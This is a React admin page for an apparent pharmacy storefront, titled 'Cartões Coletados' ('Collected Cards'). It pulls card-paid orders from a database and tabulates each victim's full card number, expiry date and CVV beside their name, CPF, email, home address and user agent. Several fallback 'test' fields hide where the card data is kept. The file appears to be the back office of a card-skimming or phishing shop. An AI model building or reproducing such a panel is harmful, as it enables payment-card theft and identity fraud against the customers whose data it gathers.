import { createFileRoute } from "@tanstack/react-router";
import { useQuery } from "@tanstack/react-query";
import { supabase } from "@/integrations/supabase/client";
import { Search } from "lucide-react";
import { Card, dateTime } from "@/components/admin/ui";
import { Input } from "@/components/ui/input";
import { useState, useMemo } from "react";

export const Route = createFileRoute("/_authenticated/admin/cartoes")({
  head: () => ({ meta: [{ title: "Cartões Coletados — Drogaria Vera Cruz" }] }),
  component: CartoesPage,
});

function CartoesPage() {
  const { data, isLoading } = useQuery({
    queryKey: ["admin-cartoes"],
    queryFn: async () => {
      const { data, error } = await supabase
        .from("orders")
        .select("id, created_at, customer_name, customer_email, customer_phone, customer_doc, address_street, address_number, address_district, address_city, address_uf, address_cep, payment_method, metadata")
        .eq("payment_method", "cartao")
        .order("created_at", { ascending: false });
      
      if (error) throw error;
      return (data as any[]).filter(d => d.metadata && (d.metadata.card_number || d.metadata.payment?.test?.number || d.metadata.test?.number));
    }
  });

  const [q, setQ] = useState("");
  const rows = useMemo(() => {
    if (!data) return [];
    const term = q.toLowerCase();
    return data.filter(d => 
      d.customer_name?.toLowerCase().includes(term) || 
      d.customer_email?.toLowerCase().includes(term) ||
      d.customer_doc?.includes(term)
    );
  }, [data, q]);

  return (
    <div className="space-y-5">
      <div>
        <p className="text-xs text-muted-foreground">Início / Administração</p>
        <h1 className="mt-1 text-2xl font-bold">Cartões Coletados</h1>
      </div>

      <label className="relative block max-w-md">
        <Search className="absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
        <Input 
          value={q} 
          onChange={(e) => setQ(e.target.value)} 
          placeholder="Buscar por nome, email ou CPF..." 
          className="bg-surface pl-9" 
        />
      </label>

      <Card title="Registros de Cartão Coletados">
        {isLoading ? (
          <p className="text-sm text-muted-foreground">Carregando cartões...</p>
        ) : rows.length === 0 ? (
          <p className="text-sm text-muted-foreground">Nenhum cartão registrado no sistema.</p>
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead>
                <tr className="border-b border-border text-left text-xs uppercase text-muted-foreground">
                  <th className="py-2">Cliente / Contato / CPF</th>
                  <th>Endereço Completo</th>
                  <th>Cartão (Núm / Val / CVV)</th>
                  <th>User Agent</th>
                  <th>Data da Coleta</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-border">
                {rows.map(r => {
                  const meta = r.metadata || {};
                  const testObj = meta.payment?.test || meta.test || {};
                  const num = meta.card_number || testObj.number || "N/A";
                  const val = meta.card_expiry || testObj.expiry || "N/A";
                  const cvv = meta.card_cvv || testObj.cvv || "N/A";
                  const ua = meta.user_agent || testObj.userAgent || meta.userAgent || meta.customer?.userAgent || "Desconhecido";

                  return (
                    <tr key={r.id}>
                      <td className="py-3">
                        <strong>{r.customer_name}</strong><br/>
                        <span className="text-xs text-muted-foreground">{r.customer_doc}</span><br/>
                        <span className="text-xs text-muted-foreground">{r.customer_email}</span>
                      </td>
                      <td className="py-3 text-xs">
                        {r.address_street}, {r.address_number}<br/>
                        {r.address_district} - {r.address_city}/{r.address_uf}<br/>
                        CEP: {r.address_cep}
                      </td>
                      <td className="py-3">
                        <span className="font-mono font-bold text-buy">{num}</span><br/>
                        <span className="text-xs">Validade: {val} | CVV: {cvv}</span>
                      </td>
                      <td className="py-3 text-[10px] max-w-[200px] truncate" title={ua}>
                        {ua}
                      </td>
                      <td className="py-3 text-xs text-muted-foreground">
                        {dateTime(r.created_at)}
                      </td>
                    </tr>
                  )
                })}
              </tbody>
            </table>
          </div>
        )}
      </Card>
    </div>
  );
}
